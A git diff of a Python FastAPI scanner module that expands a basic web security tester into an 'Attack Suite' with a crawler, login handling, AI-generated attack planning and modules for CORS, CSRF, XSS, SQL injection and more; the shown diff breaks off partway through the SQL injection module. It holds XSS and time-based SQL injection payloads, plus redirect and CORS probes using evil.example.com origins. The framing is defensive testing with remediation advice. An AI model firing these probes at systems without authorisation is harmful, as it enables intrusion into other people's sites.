@@ -1,9 +1,19 @@
 """
-Attack Suite API — non-AI web security testing via httpx.
+AttackTrace Advanced Attack Suite — Adaptive Intelligence Web Security Scanner.
 
-Tests a target URL for common vulnerabilities using bug bounty TTPs.
-No external CLI tools required — all tests use httpx.
+Architecture:
+  Layer 1: Crawler        — BFS link/form/API discovery, auth-aware
+  Layer 2: Pattern Engine — 5700+ bug bounty report patterns (attack_patterns.py)
+  Layer 3: AI Planner     — Claude fingerprints target, plans prioritised attack strategy
+  Layer 4: 17 Modules     — Systematic testing of all discovered endpoints
+
+Top vulnerability categories (from 5708 real bug bounty reports):
+  IDOR (1854), CORS (1050), CSRF (660), Stored XSS (611),
+  Privilege Escalation (276), GraphQL (175), Open Redirect (168),
+  Account Takeover (167), Cache Poisoning (104), SSRF (79)
 """
+
+from __future__ import annotations
 
 import asyncio
 import base64
@@ -14,8 +24,8 @@ import re
 import time
 import uuid
 from datetime import datetime, timezone
-from typing import Annotated, AsyncGenerator, TypedDict
-from urllib.parse import urlparse
+from typing import Annotated, AsyncGenerator, Optional
+from urllib.parse import urljoin, urlparse, urlunparse, urlencode, parse_qs
 
 import httpx
 from fastapi import APIRouter, Depends, HTTPException, status
@@ -23,36 +33,90 @@ from fastapi.responses import StreamingResponse
 from pydantic import BaseModel, field_validator
 
 from app.core.dependencies import get_current_user
+from app.core.config import get_settings
 from app.models.db.user import User
+from app.api.v1.attack_patterns import (
+    CORS_ATTACK_ORIGINS, CORS_SENSITIVE_PATHS,
+    CSRF_SENSITIVE_ACTIONS,
+    XSS_PAYLOADS, XSS_TEST_PARAMS,
+    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_ERROR_PATTERNS, SQLI_TEST_PARAMS,
+    SSRF_PARAMS, SSRF_TARGETS,
+    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS,
+    PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS,
+    ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS, ATO_EMAIL_CHANGE_ENDPOINTS,
+    CACHE_POISON_HEADERS, CACHE_POISON_VALUES,
+    RACE_CONDITION_ENDPOINTS,
+    BUSINESS_LOGIC_TESTS,
+    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_BATCH, GRAPHQL_AUTH_BYPASS_QUERIES,
+    JWT_WEAK_SECRETS, JWT_KID_PAYLOADS,
+    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
+    TECH_SIGNATURES, COMMON_SENSITIVE_PATHS,
+)
 
 router = APIRouter(prefix="/attack-suite", tags=["AttackSuite"])
-
+settings = get_settings()
 _scan_history: dict[str, dict] = {}
 
-AVAILABLE_MODULES = {
-    "headers": "Security headers analysis — checks for missing/misconfigured HTTP security headers",
-    "redirect": "Open redirect testing — fuzzes common redirect parameters",
-    "xss": "Reflected XSS detection — tests URL parameters with common payloads",
-    "sqli": "SQL injection detection — time-based blind and error-based tests",
-    "ssrf": "SSRF detection — tests for Server-Side Request Forgery via common params",
-    "graphql": "GraphQL security — introspection and batch query checks",
-    "jwt": "JWT vulnerability testing — alg:none, weak secrets, claims exposure",
-    "auth_bypass": "Auth bypass techniques — admin path exposure, method override, X-Forwarded-For",
-    "takeover": "Subdomain/service takeover fingerprinting — checks for unclaimed service responses",
-}
+MODULES_META = [
+    {"id": "crawl",         "label": "Web Crawler",           "description": "BFS crawl to discover all endpoints, forms, and parameters before testing"},
+    {"id": "headers",       "label": "Security Headers",       "description": "Missing/misconfigured HTTP security headers (CSP, HSTS, CORS, X-Frame-Options)"},
+    {"id": "cors",          "label": "CORS Misconfiguration",  "description": "Reflected origin, null origin, subdomain bypass — #2 in bug bounty dataset (1050 reports)"},
+    {"id": "csrf",          "label": "CSRF Bypass",            "description": "SameSite bypass, missing CSRF tokens, login CSRF — #3 in dataset (660 reports)"},
+    {"id": "xss",           "label": "XSS Scanner",            "description": "Reflected & stored XSS in discovered forms and URL params — 611 stored XSS reports"},
+    {"id": "sqli",          "label": "SQL Injection",          "description": "Time-based blind and error-based SQLi across all discovered parameters"},
+    {"id": "ssrf",          "label": "SSRF Prober",            "description": "Cloud metadata, internal services — 79 SSRF + 18 blind SSRF reports"},
+    {"id": "idor",          "label": "IDOR Scanner",           "description": "Cross-account access testing on crawled endpoints — #1 in dataset (1854 reports)"},
+    {"id": "privilege",     "label": "Privilege Escalation",   "description": "Mass assignment, role tampering, admin paths — 276 reports"},
+    {"id": "account",       "label": "Account Takeover",       "description": "Password reset host injection, email change, OAuth flow — 167 reports"},
+    {"id": "cache",         "label": "Cache Poisoning",        "description": "Unkeyed header injection (X-Forwarded-Host, X-Host) — 104 reports"},
+    {"id": "race",          "label": "Race Conditions",        "description": "Parallel request attacks on state-changing endpoints — 39 reports"},
+    {"id": "business",      "label": "Business Logic",         "description": "Negative price, quantity overflow, coupon stacking — 51 reports"},
+    {"id": "graphql",       "label": "GraphQL Inspector",      "description": "Introspection, batch abuse, auth bypass — 175 reports + top Amazon endpoint"},
+    {"id": "jwt",           "label": "JWT Analyzer",           "description": "alg:none, weak secrets, kid injection, claims exposure — 60 reports"},
+    {"id": "redirect",      "label": "Open Redirect",          "description": "OAuth redirect_uri, redirect param bypass — 168 reports, chains to ATO"},
+    {"id": "auth_bypass",   "label": "Auth Bypass",            "description": "Admin paths, X-Forwarded-For, method override, sensitive file exposure"},
+]
 
+# ── Models ────────────────────────────────────────────────────────────────────
+
+class CrawlerConfig(BaseModel):
+    enabled: bool = True
+    max_depth: int = 3
+    max_pages: int = 100
+    respect_robots: bool = True
+
+class LoginConfig(BaseModel):
+    enabled: bool = False
+    login_url: str = ""
+    username: str = ""
+    password: str = ""
+    username_field: str = "username"
+    password_field: str = "password"
+    login_type: str = "form"          # form | bearer | basic | cookie
+    bearer_token: str = ""
+    cookie: str = ""
+
+class Account2Config(BaseModel):
+    """Second account for IDOR testing (cross-account access)."""
+    enabled: bool = False
+    bearer_token: str = ""
+    cookie: str = ""
 
 class AttackSuiteRequest(BaseModel):
     target: str
-    modules: list[str] = ["headers", "redirect", "xss", "sqli", "ssrf", "graphql", "jwt", "auth_bypass", "takeover"]
+    modules: list[str] = [m["id"] for m in MODULES_META]
     auth_headers: dict[str, str] = {}
     follow_redirects: bool = True
     timeout: int = 10
+    crawler: CrawlerConfig = CrawlerConfig()
+    login: LoginConfig = LoginConfig()
+    account2: Account2Config = Account2Config()
+    ai_analysis: bool = True          # Use Claude to plan strategy + analyse responses
 
     @field_validator("target")
     @classmethod
     def validate_target(cls, v: str) -> str:
-        v = v.strip()
+        v = v.strip().rstrip("/")
         if not v:
             raise ValueError("Target is required")
         if re.search(r"[;&|`$(){}<>]", v):
@@ -61,553 +125,1035 @@ class AttackSuiteRequest(BaseModel):
             raise ValueError("Target must start with http:// or https://")
         return v
 
-    @field_validator("modules")
-    @classmethod
-    def validate_modules(cls, v: list[str]) -> list[str]:
-        valid = set(AVAILABLE_MODULES.keys())
-        invalid = [m for m in v if m not in valid]
-        if invalid:
-            raise ValueError(f"Unknown modules: {invalid}. Valid: {sorted(valid)}")
-        return v
-
     @field_validator("timeout")
     @classmethod
     def validate_timeout(cls, v: int) -> int:
-        if not (1 <= v <= 60):
-            raise ValueError("Timeout must be between 1 and 60 seconds")
-        return v
+        return max(5, min(v, 60))
 
 
-class AttackFinding(TypedDict):
-    id: str
-    module: str
-    test_name: str
-    severity: str  # critical, high, medium, low, info
-    title: str
-    description: str
-    evidence: str
-    url: str
-    is_vulnerable: bool
-    remediation: str
+def _finding(module: str, test_name: str, severity: str, title: str,
+             description: str, evidence: str, url: str, is_vulnerable: bool,
+             remediation: str, confidence: str = "medium") -> dict:
+    return {
+        "id": str(uuid.uuid4()),
+        "module": module,
+        "test_name": test_name,
+        "severity": severity,
+        "confidence": confidence,
+        "title": title,
+        "description": description,
+        "evidence": evidence,
+        "url": url,
+        "is_vulnerable": is_vulnerable,
+        "remediation": remediation,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+    }
 
 
-def _finding(
-    module: str,
-    test_name: str,
-    severity: str,
-    title: str,
-    description: str,
-    evidence: str,
-    url: str,
-    is_vulnerable: bool,
-    remediation: str,
-) -> AttackFinding:
-    return AttackFinding(
-        id=str(uuid.uuid4()),
-        module=module,
-        test_name=test_name,
-        severity=severity,
-        title=title,
-        description=description,
-        evidence=evidence,
-        url=url,
-        is_vulnerable=is_vulnerable,
-        remediation=remediation,
-    )
+def _sse(event: str, data: dict) -> str:
+    return f"event: {event}\ndata: {json.dumps(data)}\n\n"
 
 
-# ---------------------------------------------------------------------------
-# Module 1: Security Headers
-# ---------------------------------------------------------------------------
+# ── Crawler ───────────────────────────────────────────────────────────────────
 
-async def _module_headers(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    try:
-        resp = await client.get(target)
-    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError) as exc:
-        return
-
-    headers = {k.lower(): v for k, v in resp.headers.items()}
-
-    # HSTS
-    if "strict-transport-security" not in headers:
-        yield _finding(
-            module="headers",
-            test_name="missing_hsts",
-            severity="medium",
-            title="Missing Strict-Transport-Security Header",
-            description="The Strict-Transport-Security (HSTS) header is not set. This allows downgrade attacks.",
-            evidence="Header 'Strict-Transport-Security' not present in response",
-            url=target,
-            is_vulnerable=True,
-            remediation="Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
-        )
-
-    # CSP
-    if "content-security-policy" not in headers:
-        yield _finding(
-            module="headers",
-            test_name="missing_csp",
-            severity="medium",
-            title="Missing Content-Security-Policy Header",
-            description="No Content-Security-Policy header found. This increases XSS risk.",
-            evidence="Header 'Content-Security-Policy' not present in response",
-            url=target,
-            is_vulnerable=True,
-            remediation="Add a Content-Security-Policy header that restricts script sources.",
-        )
-
-    # X-Frame-Options / frame-ancestors in CSP
-    csp_value = headers.get("content-security-policy", "")
-    xfo_value = headers.get("x-frame-options", "")
-    if not xfo_value and "frame-ancestors" not in csp_value:
-        yield _finding(
-            module="headers",
-            test_name="missing_xfo",
-            severity="medium",
-            title="Missing X-Frame-Options / frame-ancestors",
-            description="No clickjacking protection found. The page may be embeddable in iframes.",
-            evidence="Neither 'X-Frame-Options' header nor 'frame-ancestors' CSP directive found",
-            url=target,
-            is_vulnerable=True,
-            remediation="Add 'X-Frame-Options: DENY' or include 'frame-ancestors' in your CSP.",
-        )
-
-    # X-Content-Type-Options
-    xcto = headers.get("x-content-type-options", "")
-    if xcto.lower() != "nosniff":
-        yield _finding(
-            module="headers",
-            test_name="missing_xcto",
-            severity="low",
-            title="Missing X-Content-Type-Options: nosniff",
-            description="MIME-type sniffing is not disabled. Browsers may interpret files as a different MIME type.",
-            evidence=f"X-Content-Type-Options: {xcto!r}" if xcto else "Header not present",
-            url=target,
-            is_vulnerable=True,
-            remediation="Add: X-Content-Type-Options: nosniff",
-        )
-
-    # Referrer-Policy
-    if "referrer-policy" not in headers:
-        yield _finding(
-            module="headers",
-            test_name="missing_referrer_policy",
-            severity="low",
-            title="Missing Referrer-Policy Header",
-            description="Without a Referrer-Policy, sensitive URL data may leak to third parties via the Referer header.",
-            evidence="Header 'Referrer-Policy' not present",
-            url=target,
-            is_vulnerable=True,
-            remediation="Add: Referrer-Policy: strict-origin-when-cross-origin",
-        )
-
-    # Permissions-Policy
-    if "permissions-policy" not in headers:
-        yield _finding(
-            module="headers",
-            test_name="missing_permissions_policy",
-            severity="info",
-            title="Missing Permissions-Policy Header",
-            description="No Permissions-Policy header to restrict browser feature access.",
-            evidence="Header 'Permissions-Policy' not present",
-            url=target,
-            is_vulnerable=False,
-            remediation="Add a Permissions-Policy header to restrict camera, microphone, geolocation, etc.",
-        )
-
-    # Server header version disclosure
-    server = headers.get("server", "")
-    if server and re.search(r"[\d.]+", server):
-        yield _finding(
-            module="headers",
-            test_name="server_version_disclosure",
-            severity="low",
-            title="Server Header Reveals Version Information",
-            description=f"The Server header discloses version information which aids fingerprinting.",
-            evidence=f"Server: {server}",
-            url=target,
-            is_vulnerable=True,
-            remediation="Configure the server to omit version details from the Server header.",
-        )
-
-    # X-Powered-By
-    xpb = headers.get("x-powered-by", "")
-    if xpb:
-        yield _finding(
-            module="headers",
-            test_name="x_powered_by",
-            severity="low",
-            title="X-Powered-By Header Present",
-            description="The X-Powered-By header discloses technology stack information.",
-            evidence=f"X-Powered-By: {xpb}",
-            url=target,
-            is_vulnerable=True,
-            remediation="Remove the X-Powered-By header from server configuration.",
-        )
-
-    # CORS wildcard with credentials
-    acao = headers.get("access-control-allow-origin", "")
-    acac = headers.get("access-control-allow-credentials", "")
-    if acao == "*" and acac.lower() == "true":
-        yield _finding(
-            module="headers",
-            test_name="cors_wildcard_credentials",
-            severity="high",
-            title="CORS Wildcard with Credentials Allowed",
-            description="Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true is an insecure CORS configuration.",
-            evidence=f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
-            url=target,
-            is_vulnerable=True,
-            remediation="Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. Specify exact origins.",
-        )
+class CrawlResult:
+    def __init__(self):
+        self.pages: list[dict] = []          # {url, status, headers, body_snippet}
+        self.forms: list[dict] = []          # {url, action, method, inputs}
+        self.endpoints: set[str] = set()     # all discovered URLs
+        self.params: dict[str, set] = {}     # url -> set of parameter names
+        self.tech_stack: list[str] = []
+        self.ids_found: list[str] = []       # numeric/UUID IDs in URLs
 
 
-# ---------------------------------------------------------------------------
-# Module 2: Open Redirect
-# ---------------------------------------------------------------------------
+async def _crawl(target: str, client: httpx.AsyncClient,
+                 cfg: CrawlerConfig) -> CrawlResult:
+    result = CrawlResult()
+    visited: set[str] = set()
+    queue: list[tuple[str, int]] = [(target, 0)]
+    parsed_base = urlparse(target)
 
-async def _module_redirect(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    redirect_params = [
-        "url", "redirect", "next", "return", "returnUrl", "redirectTo",
-        "goto", "dest", "destination", "rurl", "target", "link", "to", "ref",
-    ]
-    evil_payloads = [
-        "https://evil.example.com",
-        "//evil.example.com",
-    ]
+    while queue and len(visited) < cfg.max_pages:
+        url, depth = queue.pop(0)
+        if url in visited or depth > cfg.max_depth:
+            continue
+        visited.add(url)
 
-    found = set()
+        try:
+            r = await client.get(url, timeout=8, follow_redirects=True)
+        except httpx.HTTPError:
+            continue
 
-    for param in redirect_params:
-        for payload in evil_payloads:
-            test_url = f"{target}?{param}={payload}"
+        result.endpoints.add(url)
+        body = r.text[:50000]
+
+        result.pages.append({
+            "url": url,
+            "status": r.status_code,
+            "content_type": r.headers.get("content-type", ""),
+            "headers": dict(r.headers),
+            "body_snippet": body[:500],
+        })
+
+        # Fingerprint tech stack
+        _fingerprint(r, result)
+
+        # Extract IDs from URL
+        for id_val in re.findall(r'/(\d{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', url):
+            result.ids_found.append(id_val)
+
+        # Only crawl HTML pages
+        ct = r.headers.get("content-type", "")
+        if "text/html" not in ct:
+            continue
+
+        # Extract links
+        for href in re.findall(r'href=["\']([^"\'#]+)["\']', body):
+            abs_url = urljoin(url, href).split("?")[0].split("#")[0]
+            parsed = urlparse(abs_url)
+            if parsed.netloc == parsed_base.netloc and abs_url not in visited:
+                queue.append((abs_url, depth + 1))
+
+        # Extract forms
+        for form_match in re.finditer(
+            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
+            body, re.DOTALL | re.IGNORECASE
+        ):
+            action, method, form_body = form_match.groups()
+            abs_action = urljoin(url, action) if action else url
+            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*/?>',
+                                form_body, re.IGNORECASE)
+            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']',
+                                   form_body, re.IGNORECASE)
+            result.forms.append({
+                "source_url": url,
+                "action": abs_action,
+                "method": method.upper() or "GET",
+                "inputs": inputs + textareas,
+            })
+
+        # Extract JS API calls
+        for api_path in re.findall(r'["\'](/api/[\w/\-_.{}?=&%]+)["\']', body):
+            abs_api = urljoin(target, api_path)
+            if urlparse(abs_api).netloc == parsed_base.netloc:
+                result.endpoints.add(abs_api)
+
+        await asyncio.sleep(0)
+
+    return result
+
+
+def _fingerprint(r: httpx.Response, result: CrawlResult) -> None:
+    headers_str = str(dict(r.headers)).lower()
+    body_lower = r.text[:5000].lower()
+    server = r.headers.get("server", "").lower()
+    powered_by = r.headers.get("x-powered-by", "").lower()
+
+    for tech, sig in TECH_SIGNATURES.items():
+        for signal in sig["signals"]:
+            if signal.lower() in headers_str or signal.lower() in body_lower:
+                if tech not in result.tech_stack:
+                    result.tech_stack.append(tech)
+                break
+
+
+# ── Login Manager ─────────────────────────────────────────────────────────────
+
+async def _perform_login(client: httpx.AsyncClient, cfg: LoginConfig,
+                         target: str) -> dict[str, str]:
+    """Returns auth headers to inject for authenticated requests."""
+    if not cfg.enabled:
+        return {}
+
+    if cfg.login_type == "bearer":
+        return {"Authorization": f"Bearer {cfg.bearer_token}"}
+
+    if cfg.login_type == "basic":
+        creds = base64.b64encode(f"{cfg.username}:{cfg.password}".encode()).decode()
+        return {"Authorization": f"Basic {creds}"}
+
+    if cfg.login_type == "cookie":
+        return {"Cookie": cfg.cookie}
+
+    if cfg.login_type == "form":
+        login_url = cfg.login_url or f"{target}/login"
+        try:
+            # First get CSRF token if present
+            r = await client.get(login_url, timeout=10)
+            csrf = ""
+            for name in ["csrf_token", "csrfmiddlewaretoken", "_csrf", "authenticity_token"]:
+                m = re.search(
+                    rf'<input[^>]*name=["\']?{re.escape(name)}["\']?[^>]*value=["\']([^"\']+)["\']',
+                    r.text, re.IGNORECASE)
+                if m:
+                    csrf = m.group(1)
+                    break
+
+            payload = {
+                cfg.username_field: cfg.username,
+                cfg.password_field: cfg.password,
+            }
+            if csrf:
+                payload["csrf_token"] = csrf
+                payload["csrfmiddlewaretoken"] = csrf
+
+            lr = await client.post(login_url, data=payload, timeout=10,
+                                   follow_redirects=True)
+
+            cookies = dict(lr.cookies)
+            if cookies:
+                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
+                return {"Cookie": cookie_str}
+
+            # Check for JWT in response JSON
             try:
-                # Disable follow_redirects so we can inspect Location header
-                resp = await client.get(test_url, follow_redirects=False)
-                location = resp.headers.get("location", "")
-                if "evil.example.com" in location:
-                    key = f"{param}:{payload}"
-                    if key not in found:
-                        found.add(key)
-                        yield _finding(
-                            module="redirect",
-                            test_name=f"open_redirect_{param}",
-                            severity="high",
-                            title=f"Open Redirect via '{param}' Parameter",
-                            description=f"The parameter '{param}' accepts an arbitrary URL and redirects the user without validation.",
-                            evidence=f"GET {test_url}\nHTTP {resp.status_code}\nLocation: {location}",
-                            url=test_url,
-                            is_vulnerable=True,
-                            remediation="Validate redirect URLs against an allowlist of known-good destinations. Reject off-site redirects.",
-                        )
-            except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-                continue
+                data = lr.json()
+                for key in ["access_token", "token", "accessToken", "jwt", "id_token"]:
+                    if key in data:
+                        return {"Authorization": f"Bearer {data[key]}"}
+            except Exception:
+                pass
+        except httpx.HTTPError:
+            pass
+
+    return {}
 
 
-# ---------------------------------------------------------------------------
-# Module 3: Reflected XSS
-# ---------------------------------------------------------------------------
+# ── AI Strategy Planner ───────────────────────────────────────────────────────
 
-async def _module_xss(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    payloads = [
-        "<script>alert(1)</script>",
-        '"><img src=x onerror=alert(1)>',
-        "<svg onload=alert(1)>",
-    ]
-    params = ["q", "search", "input"]
-    detection_patterns = [
-        "<script>alert",
-        "onerror=alert",
-        "onload=alert",
-    ]
-
-    found_xss = False
-
-    for param in params:
-        for payload in payloads:
-            test_url = f"{target}?{param}={payload}"
-            try:
-                resp = await client.get(test_url)
-                ct = resp.headers.get("content-type", "")
-                if "text/html" in ct:
-                    body = resp.text
-                    for pattern in detection_patterns:
-                        if pattern in body:
-                            if not found_xss:
-                                found_xss = True
-                                yield _finding(
-                                    module="xss",
-                                    test_name=f"reflected_xss_{param}",
-                                    severity="high",
-                                    title=f"Reflected XSS via '{param}' Parameter",
-                                    description=f"XSS payload reflected unencoded in HTML response via the '{param}' parameter.",
-                                    evidence=f"GET {test_url}\nPayload: {payload}\nPattern found: {pattern}",
-                                    url=test_url,
-                                    is_vulnerable=True,
-                                    remediation="HTML-encode all user input before rendering in responses. Implement a Content-Security-Policy.",
-                                )
-                            break
-            except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-                continue
-
-    # Check X-XSS-Protection: 0
+async def _ai_plan_attack(target: str, tech_stack: list[str],
+                          endpoints: list[str], modules: list[str]) -> str:
+    """Use Claude to generate a prioritised attack strategy."""
+    if not settings.ANTHROPIC_API_KEY:
+        return ""
     try:
-        resp = await client.get(target)
-        xxp = resp.headers.get("x-xss-protection", "")
-        if xxp.strip() == "0":
-            yield _finding(
-                module="xss",
-                test_name="xss_protection_disabled",
-                severity="info",
-                title="X-XSS-Protection Header Set to 0 (Disabled)",
-                description="The X-XSS-Protection header is explicitly set to 0, disabling the browser's built-in XSS filter.",
-                evidence=f"X-XSS-Protection: {xxp}",
-                url=target,
-                is_vulnerable=False,
-                remediation="While modern browsers no longer rely on this header, consider removing it or setting it to '1; mode=block'.",
-            )
-    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
+        import anthropic
+        client = anthropic.AsyncAnthropic(api_key=settings.ANTHROPIC_API_KEY)
+        prompt = f"""You are an expert bug bounty hunter analyzing a target for security vulnerabilities.
+
+Target: {target}
+Detected tech stack: {', '.join(tech_stack) if tech_stack else 'unknown'}
+Discovered endpoints (sample): {json.dumps(endpoints[:20])}
+Modules to run: {', '.join(modules)}
+
+Based on the tech stack and endpoints, provide a BRIEF prioritised attack strategy (max 200 words):
+1. Which vulnerability types are most likely given this tech stack?
+2. Which endpoints should be tested first?
+3. Any specific payloads or techniques to prioritise?
+
+Be specific and actionable. Focus on high-severity findings."""
+
+        msg = await client.messages.create(
+            model=settings.AI_MODEL,
+            max_tokens=300,
+            messages=[{"role": "user", "content": prompt}],
+        )
+        return msg.content[0].text
+    except Exception:
+        return ""
+
+
+async def _ai_analyze_response(module: str, test_name: str, url: str,
+                                request_info: str, response_info: str) -> str:
+    """Ask Claude whether a response indicates a real vulnerability."""
+    if not settings.ANTHROPIC_API_KEY:
+        return ""
+    try:
+        import anthropic
+        client = anthropic.AsyncAnthropic(api_key=settings.ANTHROPIC_API_KEY)
+        msg = await client.messages.create(
+            model=settings.AI_MODEL,
+            max_tokens=200,
+            messages=[{"role": "user", "content": (
+                f"Security test result — analyze for real vulnerability:\n"
+                f"Module: {module} | Test: {test_name}\n"
+                f"URL: {url}\n"
+                f"Request: {request_info[:300]}\n"
+                f"Response: {response_info[:400]}\n\n"
+                f"Is this a real vulnerability? Severity? What follow-up should I do? "
+                f"Answer in 2-3 sentences max."
+            )}],
+        )
+        return msg.content[0].text
+    except Exception:
+        return ""
+
+
+# ── Module: Security Headers ──────────────────────────────────────────────────
+
+async def _module_headers(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    try:
+        r = await client.get(target, timeout=10)
+        h = {k.lower(): v for k, v in r.headers.items()}
+
+        checks = [
+            ("strict-transport-security" not in h, "hsts_missing", "medium",
+             "Missing HSTS Header",
+             "No Strict-Transport-Security header. Enables protocol downgrade attacks.",
+             "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
+            ("content-security-policy" not in h, "csp_missing", "medium",
+             "Missing Content-Security-Policy",
+             "No CSP header. XSS attacks can execute arbitrary scripts without restriction.",
+             "Implement a restrictive Content-Security-Policy with default-src 'self'"),
+            (not h.get("x-frame-options") and "frame-ancestors" not in h.get("content-security-policy", ""),
+             "clickjacking", "medium",
+             "Clickjacking Risk (No X-Frame-Options / frame-ancestors)",
+             "Page can be embedded in attacker-controlled iframes for clickjacking attacks.",
+             "Add X-Frame-Options: DENY or CSP frame-ancestors 'none'"),
+            (h.get("x-content-type-options", "").lower() != "nosniff",
+             "xcto_missing", "low",
+             "Missing X-Content-Type-Options: nosniff",
+             "Browser MIME-sniffing can cause content-type confusion attacks.",
+             "Add: X-Content-Type-Options: nosniff"),
+            ("referrer-policy" not in h, "referrer_policy", "low",
+             "Missing Referrer-Policy",
+             "URL parameters may leak to third parties via Referer header.",
+             "Add: Referrer-Policy: strict-origin-when-cross-origin"),
+            ("permissions-policy" not in h and "feature-policy" not in h,
+             "permissions_policy", "info",
+             "Missing Permissions-Policy",
+             "No restrictions on browser features (camera, microphone, geolocation).",
+             "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"),
+        ]
+
+        for condition, test_name, severity, title, desc, rem in checks:
+            if condition:
+                yield _finding("headers", test_name, severity, title, desc,
+                               f"Response headers: {dict(list(h.items())[:10])}", target, True, rem)
+
+        server = h.get("server", "")
+        if server and any(c.isdigit() for c in server):
+            yield _finding("headers", "server_version", "low",
+                "Server Version Disclosure",
+                f"Server header reveals software version, aiding fingerprinting.",
+                f"Server: {server}", target, True,
+                "Configure server to suppress version in the Server header.")
+
+        if "x-powered-by" in h:
+            yield _finding("headers", "x_powered_by", "low",
+                "X-Powered-By Technology Disclosure",
+                f"Reveals backend technology: {h['x-powered-by']}",
+                f"X-Powered-By: {h['x-powered-by']}", target, True,
+                "Remove X-Powered-By header from all responses.")
+
+        acao = h.get("access-control-allow-origin", "")
+        if acao == "*" and h.get("access-control-allow-credentials", "").lower() == "true":
+            yield _finding("headers", "cors_wildcard_creds", "high",
+                "CORS Wildcard with Credentials",
+                "ACAO: * combined with Allow-Credentials: true allows cross-origin credential theft.",
+                f"ACAO: {acao}", target, True, "Specify explicit trusted origins.")
+
+    except httpx.HTTPError as e:
         pass
 
 
-# ---------------------------------------------------------------------------
-# Module 4: SQL Injection
-# ---------------------------------------------------------------------------
+# ── Module: CORS Misconfiguration ─────────────────────────────────────────────
 
-async def _module_sqli(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    params = ["id", "user", "search", "q", "page"]
-    time_payloads = [
-        "1' AND SLEEP(3)--",
-        "1; WAITFOR DELAY '0:0:3'--",
-        "1' AND pg_sleep(3)--",
+async def _module_cors(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    parsed = urlparse(target)
+    base_origin = f"{parsed.scheme}://{parsed.netloc}"
+
+    test_origins = [
+        ("null", "null"),
+        ("https://evil.example.com", "arbitrary origin"),
+        (f"https://{parsed.netloc}.evil.com", "suffix bypass"),
+        (f"https://evil.{parsed.netloc}", "prefix bypass"),
+        (f"https://evil{parsed.netloc}", "no-dot prefix bypass"),
     ]
-    error_payloads = ["'", "1'", '"']
-    error_patterns = ["SQL", "mysql", "ORA-", "syntax error", "sqlite", "pg_"]
 
-    for param in params:
-        # Baseline timing
-        baseline_url = f"{target}?{param}=1"
-        try:
-            t0 = time.monotonic()
-            await client.get(baseline_url)
-            baseline_time = time.monotonic() - t0
-        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
+    test_paths = CORS_SENSITIVE_PATHS + ["/api/me", "/api/user", "/graphql"]
+
+    for path in test_paths[:6]:
+        url = target + path
+        for origin, technique in test_origins:
+            try:
+                r = await client.options(url, headers={"Origin": origin,
+                    "Access-Control-Request-Method": "GET"}, timeout=8)
+                acao = r.headers.get("access-control-allow-origin", "")
+                acac = r.headers.get("access-control-allow-credentials", "")
+
+                if acao == origin or (origin != "null" and origin in acao):
+                    sev = "high" if acac.lower() == "true" else "medium"
+                    yield _finding("cors", f"cors_{technique.replace(' ', '_')}", sev,
+                        f"CORS Misconfiguration — {technique}",
+                        f"Origin `{origin}` is reflected in Access-Control-Allow-Origin"
+                        + (" with credentials allowed" if acac.lower() == "true" else "")
+                        + f". Technique: {technique}.",
+                        f"Request Origin: {origin}\nACAO: {acao}\nACAC: {acac}", url, True,
+                        "Implement strict CORS allowlist. Never reflect Origin header directly. "
+                        "Never combine ACAO: * with Allow-Credentials: true.",
+                        confidence="high")
+                    return  # one CORS finding per target is enough
+
+                # GET request also
+                r2 = await client.get(url, headers={"Origin": origin}, timeout=8)
+                acao2 = r2.headers.get("access-control-allow-origin", "")
+                acac2 = r2.headers.get("access-control-allow-credentials", "")
+                if acao2 == origin or (origin != "null" and origin in acao2):
+                    sev = "high" if acac2.lower() == "true" else "medium"
+                    yield _finding("cors", f"cors_get_{technique.replace(' ', '_')}", sev,
+                        f"CORS Misconfiguration on GET — {technique}",
+                        f"Origin `{origin}` reflected in ACAO on GET request to {path}.",
+                        f"ACAO: {acao2}\nACAC: {acac2}", url, True,
+                        "Implement strict CORS origin validation.",
+                        confidence="high")
+                    return
+
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+
+# ── Module: CSRF ──────────────────────────────────────────────────────────────
+
+async def _module_csrf(target: str, client: httpx.AsyncClient,
+                       forms: list[dict]) -> AsyncGenerator[dict, None]:
+    # Test form actions for missing CSRF tokens
+    for form in forms[:10]:
+        action = form.get("action", "")
+        method = form.get("method", "GET")
+        inputs = form.get("inputs", [])
+        if method != "POST":
             continue
 
-        if baseline_time >= 0.5:
-            # Already slow — skip time-based for this param
-            pass
-        else:
-            for payload in time_payloads:
-                test_url = f"{target}?{param}={payload}"
-                try:
-                    t0 = time.monotonic()
-                    await client.get(test_url)
-                    elapsed = time.monotonic() - t0
-                    if elapsed >= 2.5:
-                        yield _finding(
-                            module="sqli",
